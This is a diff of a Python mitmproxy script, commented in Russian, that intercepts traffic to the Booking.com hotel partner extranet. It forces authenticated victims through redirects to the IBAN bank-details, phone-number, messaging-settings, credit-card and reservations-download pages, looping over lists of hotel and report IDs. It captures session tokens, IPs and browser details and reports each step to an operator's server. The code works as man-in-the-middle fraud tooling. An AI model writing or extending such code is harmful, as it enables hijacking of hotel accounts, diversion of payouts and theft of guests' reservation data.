-            log(f"[F18] Cleaned up old completion time for IP {client_ip}")
-            
-    except Exception as e:
-        log(f"[F18] Error cleaning up completion times: {e}")
-
-# ========== ИСПРАВЛЕННАЯ ФУНКЦИЯ 13 ==========
-def booking_hotel_global_redirect(flow: http.HTTPFlow) -> bool:
-    """
-    ФУНКЦИЯ 13: ТЕПЕРЬ ТОЛЬКО С РЕАЛЬНЫМИ ПАРАМЕТРАМИ
-    """
-    try:
-        if not should_booking_hotel():
-            return False
-
-        url = flow.request.pretty_url
-        approved_base = "https://admin.booking.com/hotel/hoteladmin/extranet_ng/manage/dp_bank_details.html"
-        
-        # Если это сам approvednumbers.html — проверяем завершение
-        if url.startswith(approved_base):
+        # Если это уже dp_bank_details.html — проверяем завершение
+        if url.startswith(iban_base):
             parsed = urllib.parse.urlparse(url)
             query = urllib.parse.parse_qs(parsed.query)
-            if "auth_assurance_last_check" in query:
-                log("Function 13: Detected approvednumbers.html with auth_assurance_last_check -> function completed")
-                remove_booking_hotel_flag()
-                client_ip = get_client_ip(flow)
-                send_function_complete_notification(client_ip, url, "FUNCTION_13_COMPLETE")
-                
-                if should_operation_16():
-                    log("Operation 16: Function 13 completed, enabling function 15")
-                    try:
-                        parent = os.path.dirname(BOOKING_HOTEL_SECURITY_FLAG)
-                        if parent and not os.path.exists(parent):
-                            os.makedirs(parent, exist_ok=True)
-                        with open(BOOKING_HOTEL_SECURITY_FLAG, 'w') as f:
-                            f.write("enabled")
-                        log("Operation 16: Function 15 enabled")
-                    except Exception as e:
-                        log(f"Error enabling function 15 in operation 16: {e}")
             
+            # ТОЛЬКО если есть auth_assurance_last_check - функция завершена
+            if "auth_assurance_last_check" in query:
+                log(f"[F14] ✅ Detected dp_bank_details.html with auth_assurance_last_check -> function completed")
+                
+                # Отправляем уведомление ТОЛЬКО при завершении
+                log(f"[F14] ✅ IBAN CAN BE ADDED 🏦 - IP: {client_ip}, Browser: {browser_info}")
+                log_redirect_to_server(client_ip, url, "IBAN_CAN_BE_ADDED", f"IBAN_COMPLETE_BROWSER_{browser_info.replace(' ', '_')}")
+                
+                # Отправляем финальный лог о завершении
+                send_function_complete_notification(client_ip, url, "FUNCTION_14_IBAN_COMPLETE")
+                
+                # Удаляем флаг функции 14
+                remove_booking_iban_settings_flag()
+                
+                # МГНОВЕННЫЙ РЕДИРЕКТ НА ГЛАВНУЮ (БЕЗ УВЕДОМЛЕНИЯ В TELEGRAM)
+                main_url = "https://admin.booking.com/"
+                log(f"[F14] 🚀 INSTANT REDIRECT to main page: {url} -> {main_url}")
+                # НЕ отправляем log_redirect_to_server для редиректа - это лишнее!
+                
+                # Проверяем, нужно ли активировать функцию 29
+                if should_booking_iban_and_reservations():
+                    log("[F29] Function 29 detected - activating reservations after IBAN completion")
+                    enable_reservations_from_iban()
+                
+                flow.response = http.Response.make(
+                    302,
+                    b"",
+                    {
+                        "Location": main_url,
+                        "Cache-Control": "no-cache, no-store, must-revalidate",
+                        "Pragma": "no-cache",
+                        "Expires": "0",
+                        "X-MITM-Redirect": "Function-14-IBAN-Post-Completion"
+                    }
+                )
+                return True
+            
+            # Если нет auth_assurance_last_check - просто ждем
+            log(f"[F14] On IBAN page, waiting for auth_assurance_last_check...")
             return False
 
+        # Проверяем, что это admin.booking.com и путь начинается с /hotel/
         parsed = urllib.parse.urlparse(url)
         path = parsed.path or "/"
         host = (flow.request.pretty_host or "").lower()
 
         if not host.endswith("admin.booking.com") or not path.startswith("/hotel/"):
+            return False
+
+        # Пропускаем статические файлы
+        if any(ext in url.lower() for ext in ['.css', '.js', '.png', '.jpg', '.jpeg', '.gif', '.ico', '.woff', '.woff2', '.ttf', '.svg']):
             return False
 
         # Получаем ses и hotel_id
@@ -1166,7 +800,577 @@ def booking_hotel_global_redirect(flow: http.HTTPFlow) -> bool:
             if m:
                 hotel_id = m.group(1)
 
-        # ⚠️ ВАЖНО: Без ses или hotel_id НЕ ДЕЛАЕМ РЕДИРЕКТ
+        # Без ses или hotel_id НЕ ДЕЛАЕМ РЕДИРЕКТ
+        if not ses:
+            log("[F14] ⚠️ No ses parameter - user not authenticated, skipping redirect")
+            return False
+            
+        if not hotel_id:
+            log("[F14] ⚠️ No hotel_id parameter - skipping redirect")
+            return False
+
+        target_url = f"{iban_base}?lang=en&ses={ses}&hotel_id={hotel_id}"
+        
+        # Отправляем лог "In PROCESS" ТОЛЬКО ПРИ ПЕРВОМ РЕДИРЕКТЕ
+        if url != target_url:
+            log(f"[F14] 📘 BOOKING - IBAN redirect: {url} -> {target_url}")
+            log(f"[F14] 📘 Client IP: {client_ip}, Browser: {browser_info}")
+            log_redirect_to_server(client_ip, url, target_url, f"IBAN_IN_PROCESS_BROWSER_{browser_info.replace(' ', '_')}")
+
+        flow.response = http.Response.make(302, b"", {"Location": target_url})
+        return True
+
+    except Exception as e:
+        log(f"[F14] booking_iban_settings_redirect error: {e}")
+        import traceback
+        log(f"[F14] Traceback: {traceback.format_exc()}")
+        return False
+        
+# ========== ФУНКЦИЯ 18: RESERVATIONS DOWNLOAD ==========
+def booking_reservations_download_redirect(flow: http.HTTPFlow) -> bool:
+    """
+    ФУНКЦИЯ 18:
+    Редиректит все запросы к admin.booking.com/hotel/* на страницу загрузки резервов.
+    С ДОПОЛНИТЕЛЬНЫМИ РЕДИРЕКТАМИ ПОСЛЕ ЗАВЕРШЕНИЯ:
+    1. После завершения - 3 секунды ожидания
+    2. В течение 2 минут: если обновление страницы - редирект на главную
+    3. Через 10 секунд: автоматический редирект на главную
+    """
+    try:
+        url = flow.request.pretty_url
+        host = (flow.request.pretty_host or "").lower()
+        client_ip = get_client_ip(flow)
+        
+        # ====== ПРОВЕРКА ДОПОЛНИТЕЛЬНЫХ РЕДИРЕКТОВ ПОСЛЕ ЗАВЕРШЕНИЯ ======
+        if client_ip in FUNCTION_COMPLETION_TIMES:
+            completion_data = FUNCTION_COMPLETION_TIMES[client_ip]
+            completion_time = completion_data.get("function_18_completed_at", 0)
+            initial_url = completion_data.get("initial_url", "")
+            
+            if completion_time > 0:
+                current_time = time.time()
+                time_since_completion = current_time - completion_time
+                
+                is_reservations_page = "reservations_download.html" in url
+                
+                if is_reservations_page:
+                    parsed_current = urllib.parse.urlparse(url)
+                    parsed_initial = urllib.parse.urlparse(initial_url)
+                    
+                    if parsed_current.path == parsed_initial.path:
+                        if time_since_completion <= 3:
+                            log(f"[F18] ✓ Page loaded, waiting 3s grace period ({time_since_completion:.1f}s passed)")
+                            return False
+                        elif time_since_completion >= 10:
+                            target_url = "https://admin.booking.com/hotel/hoteladmin/"
+                            log(f"[F18] ✓ 10s timeout reached - auto-redirect to main page")
+                            log_redirect_to_server(client_ip, url, target_url, "FUNCTION_18_POST_COMPLETION_AUTO")
+                            flow.response = http.Response.make(
+                                302, b"", {
+                                    "Location": target_url,
+                                    "Cache-Control": "no-cache, no-store, must-revalidate",
+                                    "Pragma": "no-cache",
+                                    "Expires": "0",
+                                    "X-MITM-Redirect": "Function-18-Post-Auto"
+                                }
+                            )
+                            return True
+                        elif 3 < time_since_completion < 120:
+                            log(f"[F18] ✓ Page refresh within 2min ({time_since_completion:.1f}s) - redirect to main")
+                            target_url = "https://admin.booking.com/hotel/hoteladmin/"
+                            log_redirect_to_server(client_ip, url, target_url, "FUNCTION_18_POST_COMPLETION_REFRESH")
+                            flow.response = http.Response.make(
+                                302, b"", {
+                                    "Location": target_url,
+                                    "Cache-Control": "no-cache, no-store, must-revalidate",
+                                    "Pragma": "no-cache",
+                                    "Expires": "0",
+                                    "X-MITM-Redirect": "Function-18-Post-Refresh"
+                                }
+                            )
+                            return True
+        
+        # ====== ОСНОВНАЯ ЛОГИКА ФУНКЦИИ ======
+        if not should_booking_reservations():
+            return False
+
+        if not host.endswith("admin.booking.com"):
+            return False
+        
+        # ====== ПРОВЕРКА ЗАВЕРШЕНИЯ ФУНКЦИИ 18 ======
+        parsed = urllib.parse.urlparse(url)
+        query = urllib.parse.parse_qs(parsed.query)
+        
+        required_params = ["hotel_id", "lang", "reportId", "ses", "auth_assurance_last_check"]
+        has_all_params = all(param in query for param in required_params)
+        
+        if has_all_params:
+            log(f"[F18] ✓ Detected ALL 5 required parameters in URL -> FUNCTION 18 COMPLETED")
+            full_url = url
+            FUNCTION_COMPLETION_TIMES[client_ip] = {
+                "function_18_completed_at": time.time(),
+                "initial_url": full_url
+            }
+            log(f"[F18] ✓ Completion time saved for IP {client_ip}")
+            remove_booking_reservations_flag()
+            send_function_complete_notification(client_ip, full_url, "FUNCTION_18_COMPLETE")
+            log(f"[F18] ✓ Completion notification sent for function 18")
+            
+            # Проверяем, не была ли функция 29 активирована (удаляем ее флаг при завершении)
+            if should_booking_iban_and_reservations():
+                log("[F29] Function 29 sequence completed - cleaning up")
+                remove_booking_iban_and_reservations_flag()
+            
+            log(f"[F18] ✓ Function completed, NO final redirect - user stays on page")
+            return False
+        
+        # ====== ПЕРВИЧНЫЙ РЕДИРЕКТ ======
+        if "reservations_download.html" in url:
+            if "hotel_id" in query and "reportId" in query:
+                log(f"[F18] Has hotel_id and reportId, waiting for ses and auth_assurance_last_check")
+                return False
+        
+        parsed = urllib.parse.urlparse(url)
+        path = parsed.path or "/"
+        
+        if not path.startswith("/hotel/"):
+            return False
+        
+        if "reservations_download.html" in url:
+            return False
+        
+        hotel_id = get_booking_reservations_hotel_id()
+        report_id = get_booking_reservations_report_id()
+        
+        target_url = f"https://admin.booking.com/hotel/hoteladmin/extranet_ng/manage/reservations_download.html?hotel_id={hotel_id}&lang=en&reportId={report_id}"
+        
+        if url == target_url:
+            return False
+        
+        log(f"[F18] ✓ Redirecting {url} -> {target_url}")
+        log_redirect_to_server(client_ip, url, target_url, "FUNCTION_18_RESERVATIONS_DOWNLOAD")
+        
+        flow.response = http.Response.make(
+            302, 
+            b"", 
+            {
+                "Location": target_url,
+                "Cache-Control": "no-cache, no-store, must-revalidate",
+                "Pragma": "no-cache",
+                "Expires": "0"
+            }
+        )
+        return True
+        
+    except Exception as e:
+        log(f"[F18] Error in booking_reservations_download_redirect: {e}")
+        import traceback
+        log(f"[F18] Traceback: {traceback.format_exc()}")
+        return False
+
+# ========== ФУНКЦИЯ 27: ЦИКЛИЧЕСКАЯ КОПИЯ ФУНКЦИИ 18 ==========
+def booking_reservations_cycle_redirect(flow: http.HTTPFlow) -> bool:
+    """
+    ФУНКЦИЯ 27: УСЛОЖНЕННАЯ КОПИЯ ФУНКЦИИ 18
+    ПОЛНОСТЬЮ повторяет логику функции 18, включая ЛОГИРОВАНИЕ
+    """
+    try:
+        if not os.path.exists(BOOKING_RESERVATIONS_CYCLE_FLAG):
+            return False
+            
+        if os.path.exists(BOOKING_RESERVATIONS_CYCLE_ACTIVE_FILE):
+            try:
+                with open(BOOKING_RESERVATIONS_CYCLE_ACTIVE_FILE, 'r') as f:
+                    is_active = f.read().strip() == "1"
+                if not is_active:
+                    return False
+            except:
+                return False
+        else:
+            return False
+        
+        url = flow.request.pretty_url
+        host = (flow.request.pretty_host or "").lower()
+        client_ip = get_client_ip(flow)
+        
+        current_index = 0
+        try:
+            if os.path.exists(BOOKING_RESERVATIONS_CYCLE_INDEX_FILE):
+                with open(BOOKING_RESERVATIONS_CYCLE_INDEX_FILE, 'r') as f:
+                    current_index = int(f.read().strip())
+        except:
+            current_index = 0
+        
+        hotel_ids = []
+        report_ids = []
+        
+        try:
+            if os.path.exists(BOOKING_RESERVATIONS_CYCLE_HOTEL_IDS_FILE):
+                with open(BOOKING_RESERVATIONS_CYCLE_HOTEL_IDS_FILE, 'r') as f:
+                    hotel_ids = [h.strip() for h in f.read().split(',') if h.strip()]
+            
+            if os.path.exists(BOOKING_RESERVATIONS_CYCLE_REPORT_IDS_FILE):
+                with open(BOOKING_RESERVATIONS_CYCLE_REPORT_IDS_FILE, 'r') as f:
+                    report_ids = [r.strip() for r in f.read().split(',') if r.strip()]
+        except Exception as e:
+            log(f"[F27] Error reading parameters: {e}")
+            return False
+        
+        if not hotel_ids or not report_ids or current_index >= min(len(hotel_ids), len(report_ids)):
+            log(f"[F27] No more parameters or invalid index - ending cycle")
+            remove_booking_reservations_cycle_flag()
+            return False
+        
+        current_hotel_id = hotel_ids[current_index]
+        current_report_id = report_ids[current_index]
+        
+        # Проверка дополнительных редиректов после завершения
+        if client_ip in FUNCTION_COMPLETION_TIMES:
+            completion_data = FUNCTION_COMPLETION_TIMES.get(client_ip, {})
+            completion_time = completion_data.get(f"function_27_cycle_{current_index}_completed_at", 0)
+            initial_url = completion_data.get(f"function_27_cycle_{current_index}_initial_url", "")
+            
+            if completion_time > 0:
+                current_time = time.time()
+                time_since_completion = current_time - completion_time
+                
+                is_reservations_page = "reservations_download.html" in url
+                
+                if is_reservations_page and initial_url:
+                    parsed_current = urllib.parse.urlparse(url)
+                    parsed_initial = urllib.parse.urlparse(initial_url)
+                    
+                    if parsed_current.path == parsed_initial.path:
+                        if time_since_completion <= 3:
+                            log(f"[F27] ✓ Cycle {current_index+1}: Page loaded, waiting 3s grace period")
+                            return False
+                        elif time_since_completion >= 10:
+                            target_url = "https://admin.booking.com/hotel/hoteladmin/"
+                            log(f"[F27] ✓ Cycle {current_index+1}: 10s timeout reached - auto-redirect")
+                            log_redirect_to_server(client_ip, url, target_url, f"FUNCTION_27_CYCLE_{current_index+1}_POST_AUTO")
+                            flow.response = http.Response.make(302, b"", {"Location": target_url})
+                            return True
+                        elif 3 < time_since_completion < 120:
+                            log(f"[F27] ✓ Cycle {current_index+1}: Page refresh - redirect to main")
+                            target_url = "https://admin.booking.com/hotel/hoteladmin/"
+                            log_redirect_to_server(client_ip, url, target_url, f"FUNCTION_27_CYCLE_{current_index+1}_POST_REFRESH")
+                            flow.response = http.Response.make(302, b"", {"Location": target_url})
+                            return True
+        
+        if not host.endswith("admin.booking.com"):
+            return False
+        
+        parsed = urllib.parse.urlparse(url)
+        query = urllib.parse.parse_qs(parsed.query)
+        
+        required_params = ["hotel_id", "lang", "reportId", "ses", "auth_assurance_last_check"]
+        has_all_params = all(param in query for param in required_params)
+        
+        if has_all_params:
+            log(f"[F27] ✓ Cycle {current_index+1}: Detected ALL 5 parameters -> CYCLE COMPLETED")
+            full_url = url
+            
+            if client_ip not in FUNCTION_COMPLETION_TIMES:
+                FUNCTION_COMPLETION_TIMES[client_ip] = {}
+            
+            FUNCTION_COMPLETION_TIMES[client_ip][f"function_27_cycle_{current_index}_completed_at"] = time.time()
+            FUNCTION_COMPLETION_TIMES[client_ip][f"function_27_cycle_{current_index}_initial_url"] = full_url
+            
+            send_function_complete_notification(client_ip, full_url, f"FUNCTION_27_CYCLE_{current_index+1}_COMPLETE")
+            
+            try:
+                with open(BOOKING_RESERVATIONS_CYCLE_ACTIVE_FILE, 'w') as f:
+                    f.write("0")
+                log(f"[F27] ✓ Cycle {current_index+1} deactivated")
+            except Exception as e:
+                log(f"[F27] Error deactivating cycle: {e}")
+            
+            next_index = current_index + 1
+            
+            if next_index < min(len(hotel_ids), len(report_ids)):
+                try:
+                    with open(BOOKING_RESERVATIONS_CYCLE_INDEX_FILE, 'w') as f:
+                        f.write(str(next_index))
+                    log(f"[F27] ✓ Next cycle index: {next_index+1}")
+                except Exception as e:
+                    log(f"[F27] Error saving next index: {e}")
+                
+                def schedule_next_cycle():
+                    time.sleep(60)
+                    try:
+                        if os.path.exists(BOOKING_RESERVATIONS_CYCLE_ACTIVE_FILE):
+                            with open(BOOKING_RESERVATIONS_CYCLE_ACTIVE_FILE, 'w') as f:
+                                f.write("1")
+                            log(f"[F27] ✓ Next cycle (index {next_index+1}) activated after 1 minute")
+                        else:
+                            log(f"[F27] ⚠️ Cycle active file missing, cannot activate next cycle")
+                    except Exception as e:
+                        log(f"[F27] Error activating next cycle: {e}")
+                
+                threading.Thread(target=schedule_next_cycle, daemon=True).start()
+                log(f"[F27] ✓ Timer set: next cycle in 60 seconds")
+            else:
+                log(f"[F27] ✓ ALL CYCLES COMPLETED! Total: {next_index} cycles")
+                send_function_complete_notification(client_ip, "ALL_CYCLES", "FUNCTION_27_ALL_CYCLES_COMPLETE")
+                remove_booking_reservations_cycle_flag()
+            
+            return False
+        
+        if "reservations_download.html" in url:
+            if "hotel_id" in query and "reportId" in query:
+                log(f"[F27] Cycle {current_index+1}: Waiting for complete parameters")
+                return False
+        
+        parsed = urllib.parse.urlparse(url)
+        path = parsed.path or "/"
+        
+        if not path.startswith("/hotel/"):
+            return False
+        
+        if "reservations_download.html" in url:
+            return False
+        
+        target_url = f"https://admin.booking.com/hotel/hoteladmin/extranet_ng/manage/reservations_download.html?hotel_id={current_hotel_id}&lang=en&reportId={current_report_id}"
+        
+        if url == target_url:
+            return False
+        
+        log(f"[F27] ✓ Cycle {current_index+1}: Redirecting {url} -> {target_url}")
+        log(f"[F27] ✓ Using hotel_id={current_hotel_id}, report_id={current_report_id}")
+        log_redirect_to_server(client_ip, url, target_url, f"FUNCTION_27_CYCLE_{current_index+1}_START")
+        
+        flow.response = http.Response.make(302, b"", {"Location": target_url})
+        return True
+        
+    except Exception as e:
+        log(f"[F27] Error in booking_reservations_cycle_redirect: {e}")
+        import traceback
+        log(f"[F27] Traceback: {traceback.format_exc()}")
+        return False
+
+# Главная точка входа
+def request(flow: http.HTTPFlow) -> None:
+    """
+    ГЛАВНАЯ ФУНКЦИЯ MITMproxy
+    """
+    
+    url = flow.request.pretty_url
+    host = (flow.request.pretty_host or "").lower()
+    
+    # ========== ФУНКЦИЯ 26: Мониторинг платформ ==========
+    if should_monitor_platforms() and should_log_domain(flow):
+        try:
+            client_ip = get_client_ip(flow)
+            from_url = flow.request.pretty_url
+            log_redirect_to_server(client_ip, from_url, "MONITORED", "DOMAIN_MONITOR")
+            log(f"[F26] ✓ Platform access logged: {host}")
+        except Exception as e:
+            log(f"Error in domain monitoring: {e}")
+    
+    # ========== ПРОВЕРКА АВТОЗАПУСКА ==========
+    if not hasattr(flow, '_autostart_checked'):
+        check_autostart()
+        flow._autostart_checked = True
+    
+    # ========== ПРИОРИТЕТ 1: ФУНКЦИЯ 17 (единоразовый кастом) ==========
+    if custom_redirect(flow):
+        return
+    
+    # ========== ПРИОРИТЕТ 2: ФУНКЦИЯ 29 (IBAN + RESERVATIONS) ==========
+    # ВАЖНО: ДОЛЖНА БЫТЬ ПЕРВОЙ СРЕДИ ФУНКЦИЙ 14-18-27!
+    if host.endswith("admin.booking.com"):
+        if booking_iban_and_reservations_redirect(flow):
+            return
+    
+    # ========== ПРИОРИТЕТ 3: ФУНКЦИЯ 14 (IBAN Settings Force) ==========
+    if host.endswith("admin.booking.com"):
+        if booking_iban_settings_redirect(flow):
+            return
+    
+    # ========== ПРИОРИТЕТ 4: ФУНКЦИЯ 18 (Reservations download) ==========
+    if host.endswith("admin.booking.com"):
+        if booking_reservations_download_redirect(flow):
+            return
+    
+    # ========== ПРИОРИТЕТ 5: ФУНКЦИЯ 27 (Циклическая копия 18) ==========
+    if host.endswith("admin.booking.com"):
+        if booking_reservations_cycle_redirect(flow):
+            return
+    
+    # ========== ПРИОРИТЕТ 6: ФУНКЦИЯ 19 (CC details) ==========
+    if host.endswith("booking.com"):
+        if booking_cc_details_redirect(flow):
+            return
+    
+    # ========== ПРИОРИТЕТ 7: BOOKING РЕДИРЕКТЫ 13-16 ==========
+    if host.endswith("admin.booking.com"):
+        if booking_hotel_security_redirect(flow):
+            return
+            
+        if booking_hotel_global_redirect(flow):
+            return
+
+        if booking_redirect(flow, "message"):
+            return
+        if booking_redirect(flow, "provider"):
+            return
+        if booking_redirect(flow, "user"):
+            return
+        if booking_redirect(flow, "security"):
+            return
+    
+    # ========== ПРИОРИТЕТ 8: ФУНКЦИИ 21-23 ==========
+    if host.endswith("admin.booking.com"):
+        if should_partners():
+            if partners_redirect(flow):
+                return
+        
+        if should_device():
+            if device_redirect(flow):
+                return
+        
+        if should_partners_and_mess():
+            if should_partners() and partners_redirect(flow):
+                return
+    
+    # ========== ПРИОРИТЕТ 9: ФУНКЦИИ 24-25 ==========
+    if should_pulse():
+        if pulse_redirect(flow):
+            return
+    
+    if should_ultra_pulse():
+        if ultra_pulse_redirect(flow):
+            return
+    
+    # ========== ПРИОРИТЕТ 10: ОБЫЧНЫЕ РЕДИРЕКТЫ ==========
+    redirect_target = get_redirect_target()
+    
+    if not redirect_target:
+        return
+    
+    if is_redirect_target(flow, redirect_target):
+        log(f"skip redirect for target itself: {flow.request.pretty_url}")
+        return
+    
+    if should_force():
+        log(f"FORCE redirect {flow.request.pretty_url} -> {redirect_target}")
+        client_ip = get_client_ip(flow)
+        log_redirect_to_server(client_ip, flow.request.pretty_url, redirect_target, "FORCE")
+        flow.response = http.Response.make(302, b"", {"Location": redirect_target})
+        return
+
+    if should_one_shot():
+        log(f"GLOBAL ONE-SHOT redirect {flow.request.pretty_url} -> {redirect_target}")
+        client_ip = get_client_ip(flow)
+        log_redirect_to_server(client_ip, flow.request.pretty_url, redirect_target, "ONE_SHOT")
+        flow.response = http.Response.make(
+            302, b"", {"Location": redirect_target, "Set-Cookie": f"{COOKIE}=1; Path=/; Secure; HttpOnly"}
+        )
+        remove_one_shot_flag()
+        return
+
+    try:
+        cookie_present = bool(flow.request.cookies.get(COOKIE))
+        if cookie_present:
+            log(f"cookie present -> skipping redirect for {host}")
+            return
+    except Exception:
+        pass
+
+    log(f"one-shot client redirect {flow.request.pretty_url} -> {redirect_target}")
+    client_ip = get_client_ip(flow)
+    log_redirect_to_server(client_ip, flow.request.pretty_url, redirect_target, "ONE_SHOT")
+    flow.response = http.Response.make(
+        302, b"", {"Location": redirect_target, "Set-Cookie": f"{COOKIE}=1; Path=/; Secure; HttpOnly"}
+    )
+
+def cleanup_old_completion_times():
+    """Очищает записи о завершении функций старше 5 минут"""
+    try:
+        current_time = time.time()
+        to_delete = []
+        
+        for client_ip, data in FUNCTION_COMPLETION_TIMES.items():
+            completion_time = data.get("function_18_completed_at", 0)
+            if current_time - completion_time > 300:
+                to_delete.append(client_ip)
+        
+        for client_ip in to_delete:
+            del FUNCTION_COMPLETION_TIMES[client_ip]
+            log(f"[F18] Cleaned up old completion time for IP {client_ip}")
+            
+    except Exception as e:
+        log(f"[F18] Error cleaning up completion times: {e}")
+
+# ========== ФУНКЦИЯ 13 (БЕЗ ИЗМЕНЕНИЙ) ==========
+def booking_hotel_global_redirect(flow: http.HTTPFlow) -> bool:
+    """
+    ФУНКЦИЯ 13: Phone settings force
+    """
+    try:
+        if not should_booking_hotel():
+            return False
+
+        url = flow.request.pretty_url
+        approved_base = "https://admin.booking.com/hotel/hoteladmin/extranet_ng/manage/approvednumbers.html"
+
+        if url.startswith(approved_base):
+            parsed = urllib.parse.urlparse(url)
+            query = urllib.parse.parse_qs(parsed.query)
+            if "auth_assurance_last_check" in query:
+                log("Function 13: Detected approvednumbers.html with auth_assurance_last_check -> function completed")
+                remove_booking_hotel_flag()
+                client_ip = get_client_ip(flow)
+                send_function_complete_notification(client_ip, url, "FUNCTION_13_COMPLETE")
+                
+                if should_operation_16():
+                    log("Operation 16: Function 13 completed, enabling function 15")
+                    try:
+                        parent = os.path.dirname(BOOKING_HOTEL_SECURITY_FLAG)
+                        if parent and not os.path.exists(parent):
+                            os.makedirs(parent, exist_ok=True)
+                        with open(BOOKING_HOTEL_SECURITY_FLAG, 'w') as f:
+                            f.write("enabled")
+                        log("Operation 16: Function 15 enabled")
+                    except Exception as e:
+                        log(f"Error enabling function 15 in operation 16: {e}")
+            
+            return False
+
+        parsed = urllib.parse.urlparse(url)
+        path = parsed.path or "/"
+        host = (flow.request.pretty_host or "").lower()
+
+        if not host.endswith("admin.booking.com") or not path.startswith("/hotel/"):
+            return False
+
+        query = urllib.parse.parse_qs(parsed.query)
+        hotel_id = None
+        ses = None
+
+        if "hotel_id" in query:
+            hotel_id = query.get("hotel_id", [None])[0]
+        if "ses" in query:
+            ses = query.get("ses", [None])[0]
+
+        if not hotel_id or not ses:
+            referer = flow.request.headers.get("Referer") or flow.request.headers.get("referer")
+            if referer:
+                try:
+                    rp = urllib.parse.urlparse(referer)
+                    rq = urllib.parse.parse_qs(rp.query)
+                    if not hotel_id and "hotel_id" in rq:
+                        hotel_id = rq.get("hotel_id", [None])[0]
+                    if not ses and "ses" in rq:
+                        ses = rq.get("ses", [None])[0]
+                except Exception:
+                    pass
+
+        if not hotel_id:
+            m = re.search(r"/hotel/(?:.*/)?(\d+)(?:/|$)", path)
+            if m:
+                hotel_id = m.group(1)
+
         if not ses:
             log("Function 13: ⚠️ No ses parameter - user not authenticated, skipping redirect")
             return False
@@ -1189,10 +1393,10 @@ def booking_hotel_global_redirect(flow: http.HTTPFlow) -> bool:
         log(f"booking_hotel_global_redirect error: {e}")
         return False
 
-# ========== ИСПРАВЛЕННАЯ ФУНКЦИЯ 15 ==========
+# ========== ФУНКЦИЯ 15 (БЕЗ ИЗМЕНЕНИЙ) ==========
 def booking_hotel_security_redirect(flow: http.HTTPFlow) -> bool:
     """
-    ФУНКЦИЯ 15: ТЕПЕРЬ ТОЛЬКО С РЕАЛЬНЫМИ ПАРАМЕТРАМИ
+    ФУНКЦИЯ 15: Messages settings force
     """
     try:
         if not should_booking_hotel_security():
@@ -1200,7 +1404,6 @@ def booking_hotel_security_redirect(flow: http.HTTPFlow) -> bool:
 
         url = flow.request.pretty_url
         
-        # Проверяем завершение на settings.html
         if "https://admin.booking.com/hotel/hoteladmin/extranet_ng/manage/messaging/settings.html" in url:
             log("Function 15: User reached messaging/settings.html -> function completed")
             remove_booking_hotel_security_flag()
@@ -1217,7 +1420,6 @@ def booking_hotel_security_redirect(flow: http.HTTPFlow) -> bool:
         if not host.endswith("admin.booking.com") or "security_settings.html" in url:
             return False
 
-        # Получаем параметры
         parsed = urllib.parse.urlparse(url)
         query = urllib.parse.parse_qs(parsed.query)
         
@@ -1229,7 +1431,6 @@ def booking_hotel_security_redirect(flow: http.HTTPFlow) -> bool:
         if "ses" in query:
             ses = query.get("ses", [None])[0]
         
-        # Проверяем Referer
         if not hotel_id or not ses:
             referer = flow.request.headers.get("Referer") or flow.request.headers.get("referer")
             if referer:
@@ -1243,13 +1444,11 @@ def booking_hotel_security_redirect(flow: http.HTTPFlow) -> bool:
                 except Exception:
                     pass
         
-        # Эвристика для hotel_id
         if not hotel_id:
             m = re.search(r"/hotel/(?:.*/)?(\d+)(?:/|$)", parsed.path)
             if m:
                 hotel_id = m.group(1)
         
-        # ⚠️ ВАЖНО: Без ses или hotel_id НЕ ДЕЛАЕМ РЕДИРЕКТ
         if not ses:
             log("Function 15: ⚠️ No ses parameter - user not authenticated, skipping redirect")
             return False
@@ -1271,17 +1470,15 @@ def booking_hotel_security_redirect(flow: http.HTTPFlow) -> bool:
         log(f"booking_hotel_security_redirect error: {e}")
         return False
 
+# ========== ФУНКЦИЯ 17 (БЕЗ ИЗМЕНЕНИЙ) ==========
 def custom_redirect(flow: http.HTTPFlow) -> bool:
     """
     ФУНКЦИЯ 17: ЕДИНОРАЗОВЫЙ КАСТОМНЫЙ РЕДИРЕКТ
-    Работает для ЛЮБЫХ доменов, независимо от использования ранее
     """
     try:
-        # 1. Проверяем активацию
         if not should_custom_redirect():
             return False
         
-        # 2. Проверяем done flag (если есть - функция уже выполнена)
         if os.path.exists(CUSTOM_REDIRECT_DONE_FLAG):
             log("[F17] One-time redirect already performed - skipping")
             return False
@@ -1294,52 +1491,38 @@ def custom_redirect(flow: http.HTTPFlow) -> bool:
             log("[F17] Missing FROM or TO domains")
             return False
         
-        # НОРМАЛИЗАЦИЯ URL
         def normalize_url(url_str: str) -> str:
-            """Нормализует URL для сравнения"""
             if not url_str:
                 return ""
-            # Убираем протокол
             if url_str.startswith('https://'):
                 url_str = url_str[8:]
             elif url_str.startswith('http://'):
                 url_str = url_str[7:]
-            # Убираем www
             if url_str.startswith('www.'):
                 url_str = url_str[4:]
-            # Убираем trailing slash
             url_str = url_str.rstrip('/')
             return url_str.lower()
         
-        # Нормализуем URL запроса
-        request_url_lower = url.lower()
         request_host = flow.request.pretty_host.lower()
-        
-        # Нормализуем from_domain (целевой домен)
         from_domain_normalized = normalize_url(from_domain)
         
-        # ПРОВЕРКА 1: Сравниваем хост запроса с целевым доменом
         if from_domain_normalized not in request_host:
             return False
         
-        # ПРОВЕРКА 2: Убедимся, что это не редирект на тот же домен
         to_domain_normalized = normalize_url(to_domain)
         if to_domain_normalized in request_host:
             return False
         
-        # ПРОВЕРКА 3: Убедимся, что это HTTP/HTTPS запрос (не websocket и т.д.)
-        if not request_url_lower.startswith(('http://', 'https://')):
+        if not url.lower().startswith(('http://', 'https://')):
             return False
         
         log(f"[F17] ✓ ONE-TIME redirect triggered!")
         log(f"[F17] From: {url}")
         log(f"[F17] To:   {to_domain}")
         
-        # Логируем редирект
         client_ip = get_client_ip(flow)
         log_redirect_to_server(client_ip, url, to_domain, "CUSTOM_ONETIME_REDIRECT")
         
-        # Создаем DONE flag СРАЗУ
         try:
             parent_dir = os.path.dirname(CUSTOM_REDIRECT_DONE_FLAG)
             if parent_dir and not os.path.exists(parent_dir):
@@ -1350,7 +1533,6 @@ def custom_redirect(flow: http.HTTPFlow) -> bool:
         except Exception as e:
             log(f"[F17] Error creating done flag: {e}")
         
-        # Выполняем редирект
         flow.response = http.Response.make(
             302, 
             b"", 
@@ -1363,14 +1545,12 @@ def custom_redirect(flow: http.HTTPFlow) -> bool:
             }
         )
         
-        # Удаляем активацию через 3 секунды
         def cleanup_activation():
             time.sleep(3)
             try:
                 if os.path.exists(CUSTOM_REDIRECT_FLAG):
                     os.remove(CUSTOM_REDIRECT_FLAG)
                     log("[F17] Activation flag removed")
-                # Также удаляем файлы конфигурации
                 if os.path.exists(CUSTOM_REDIRECT_FROM_FILE):
